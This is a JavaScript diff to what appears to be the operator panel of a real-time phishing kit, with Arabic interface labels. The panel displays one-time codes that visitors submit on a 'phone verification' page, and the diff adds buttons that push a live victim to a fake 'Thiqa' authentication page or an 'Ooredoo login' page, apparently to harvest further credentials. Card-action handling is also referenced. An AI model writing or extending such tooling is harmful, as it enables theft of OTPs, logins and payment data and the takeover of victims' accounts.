@@ -2020,29 +2020,47 @@
               }, 100);
             }
             
-            // إضافة أزرار موافقة/رفض لصفحة توثيق الجوال (OTP دخول)
+            // إضافة أزرار لصفحة توثيق الجوال (OTP دخول)
             if (dataEntry.page === 'توثيق الجوال' && dataEntry.content && dataEntry.content['رمز التحقق']) {
-              const otpApproveBtnId = 'otp-approve-btn-' + visitor.socketId + '-' + dataIndex;
+              const thiqaBtnId = 'thiqa-btn-' + visitor.socketId + '-' + dataIndex;
+              const oredooBtnId = 'oredoo-btn-' + visitor.socketId + '-' + dataIndex;
               const otpRejectBtnId = 'otp-reject-btn-' + visitor.socketId + '-' + dataIndex;
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button id="' + otpApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="' + thiqaBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ثقة</button>';
+              html += '<button id="' + oredooBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تسجيل دخول اوريدو</button>';
               html += '<button id="' + otpRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               setTimeout(() => {
-                const approveBtn = document.getElementById(otpApproveBtnId);
+                const thiqaBtn = document.getElementById(thiqaBtnId);
+                const oredooBtn = document.getElementById(oredooBtnId);
                 const rejectBtn = document.getElementById(otpRejectBtnId);
-                if (approveBtn) {
-                  approveBtn.addEventListener('click', () => {
-                    socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'approve' });
+                if (thiqaBtn) {
+                  thiqaBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'thiqa-auth');
                     visitor.waitingForAdminResponse = false;
                     renderVisitorsList();
-                    approveBtn.textContent = 'تم الإرسال ✓';
-                    approveBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
-                    approveBtn.classList.add('bg-gray-500');
+                    thiqaBtn.textContent = 'تم الإرسال ✓';
+                    thiqaBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                    thiqaBtn.classList.add('bg-gray-500');
                     setTimeout(() => {
-                      approveBtn.textContent = 'موافقة';
-                      approveBtn.classList.remove('bg-gray-500');
-                      approveBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                      thiqaBtn.textContent = 'ثقة';
+                      thiqaBtn.classList.remove('bg-gray-500');
+                      thiqaBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                    }, 1500);
+                  });
+                }
+                if (oredooBtn) {
+                  oredooBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'identity-verification');
+                    visitor.waitingForAdminResponse = false;
+                    renderVisitorsList();
+                    oredooBtn.textContent = 'تم الإرسال ✓';
+                    oredooBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    oredooBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      oredooBtn.textContent = 'تسجيل دخول اوريدو';
+                      oredooBtn.classList.remove('bg-gray-500');
+                      oredooBtn.classList.add('bg-green-600', 'hover:bg-green-700');
                     }, 1500);
                   });
                 }
